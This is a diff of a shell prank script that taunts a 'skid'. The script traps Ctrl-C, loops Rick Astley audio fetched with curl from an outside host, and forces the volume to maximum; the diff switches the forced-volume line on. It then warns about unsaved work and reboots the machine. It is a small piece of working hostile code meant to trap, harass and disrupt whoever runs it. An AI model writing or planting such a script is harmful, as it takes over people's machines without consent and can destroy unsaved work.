@@ -3,14 +3,14 @@
     trap 'echo "You cannot escape you skid!!"' SIGINT
     clear
 
-    # the following code belongs to Luphoria (aka Trent) until the other comment says otherwise
+    # the following code belongs to Luphoria (aka Trent) until the next comment
     while [ 1=1 ]; do
         aplay <(curl https://micspam.dazzozo.com/Sakura/Audio/Old%20Music/Never%20Gonna%20Give%20You%20Up%20-%20Rick%20Astley.wav) | echo > /dev/null
     done & disown &
     while [ 1=1 ];
     do
         echo e > /dev/null
-        #amixer set Master 100% unmute | echo > /dev/null
+        amixer set Master 100% unmute | echo > /dev/null
     done & disown
     # the rest of the code is mine
     sleep 1
@@ -24,6 +24,6 @@
     echo "Be glad I didn't."
     sleep 3
     echo "Now, I hope you don't have any unsaved work!"
-    echo "You cannot get you out of this one!"
+    echo "You cannot get out of this one!"
     sleep 204000
     reboot
